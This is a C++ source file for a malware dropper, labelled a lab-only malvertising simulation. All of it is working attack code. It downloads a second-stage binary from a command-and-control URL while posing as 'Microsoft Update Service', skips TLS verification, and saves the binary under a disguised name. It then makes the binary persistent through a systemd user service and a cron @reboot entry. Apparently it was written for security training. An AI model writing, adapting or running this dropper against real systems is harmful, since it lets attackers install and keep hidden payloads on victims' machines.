// dropper.cpp — Malvertising payload simulation (LAB ONLY, isolated network)
// Build: g++ -O2 -std=c++17 dropper.cpp -o dropper -lcurl
#include <curl/curl.h>
#include <fstream>
#include <iostream>
#include <cstdlib>
#include <string>
#include <sys/stat.h>
#include <unistd.h>

static size_t write_cb(void* ptr, size_t sz, size_t nm, void* ud) {
    static_cast<std::string*>(ud)->append((char*)ptr, sz * nm);
    return sz * nm;
}

// Stage-2 delivery from the C2
bool fetch_stage2(const std::string& url, const std::string& out_path) {
    CURL* c = curl_easy_init();
    if (!c) return false;
    std::string buf;
    curl_easy_setopt(c, CURLOPT_URL, url.c_str());
    curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(c, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(c, CURLOPT_USERAGENT, "Microsoft Update Service"); // masquerading
    curl_easy_setopt(c, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(c, CURLOPT_SSL_VERIFYPEER, 0L);
    CURLcode rc = curl_easy_perform(c);
    curl_easy_cleanup(c);
    if (rc != CURLE_OK) return false;

    std::ofstream out(out_path, std::ios::binary);
    out << buf;
    chmod(out_path.c_str(), 0755);
    return true;
}

// Persistence: systemd user service + cron @reboot
void install_persistence() {
    const char* home = getenv("HOME");
    if (!home) return;
    std::string dir = std::string(home) + "/.config/systemd/user";
    ::mkdir(dir.c_str(), 0755);

    std::string unit_path = dir + "/sysupdate.service";
    std::ofstream unit(unit_path);
    unit << "[Unit]\nDescription=System Update Service\n\n"
         << "[Service]\nExecStart=" << home << "/.local/share/sysupdate --quiet\n"
         << "Restart=always\n\n"
         << "[Install]\nWantedBy=default.target\n";
    unit.close();

    std::string cron = "(crontab -l 2>/dev/null; echo '@reboot " + home +
                       "/.local/share/sysupdate') | crontab -";
    int rc = std::system(cron.c_str());
    (void)rc;
    std::cout << "[*] persistence installed (systemd + cron)\n";
}

int main(int argc, char** argv) {
    curl_global_init(CURL_GLOBAL_DEFAULT);

    const char* home = getenv("HOME");
    std::string install_dir = std::string(home ? home : "/tmp") + "/.local/share";
    ::mkdir(install_dir.c_str(), 0755);
    std::string stage2_path = install_dir + "/sysupdate";

    // Inside a Docker container use the service name: http://c2:8084
    // From the host terminal: http://localhost:8084
    std::string c2 = (argc > 1) ? argv[1] : "http://localhost:8084";
    std::cout << "[*] dropper running (SIMULATED payload)\n";
    std::cout << "[*] fetching stage 2 from " << c2 << "/stage2.txt\n";

    if (fetch_stage2(c2 + "/stage2.txt", stage2_path)) {
        std::cout << "[+] stage 2 dropped to " << stage2_path << "\n";
    } else {
        std::cerr << "[-] stage 2 fetch failed\n";
    }

    install_persistence();

    std::cout << "[*] done. Launching implant...\n";
    return 0;
}